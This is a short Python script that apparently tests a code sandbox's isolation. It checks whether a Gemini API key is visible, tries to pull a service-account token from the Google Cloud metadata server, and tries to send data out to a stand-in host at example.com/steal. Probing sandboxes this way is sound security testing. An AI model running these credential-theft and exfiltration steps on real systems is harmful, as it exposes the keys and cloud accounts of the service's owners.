import os
import urllib.request


def get(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    return urllib.request.urlopen(req, timeout=5).read().decode()


# 0) can the sandboxed code even see the service's secrets in its env?
print("GEMINI_API_KEY visible in sandbox:", "GEMINI_API_KEY" in os.environ)

# 1) try to steal the service account token off the metadata server
try:
    tok = get(
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        {"Metadata-Flavor": "Google"},
    )
    print("TOKEN LEAKED:", tok[:60])
except Exception as e:
    print("metadata blocked:", type(e).__name__)

# 2) try to phone the stolen data out to a server we control
try:
    get("https://example.com/steal?data=secret")
    print("EGRESS OK, data left the box")
except Exception as e:
    print("egress blocked:", type(e).__name__)
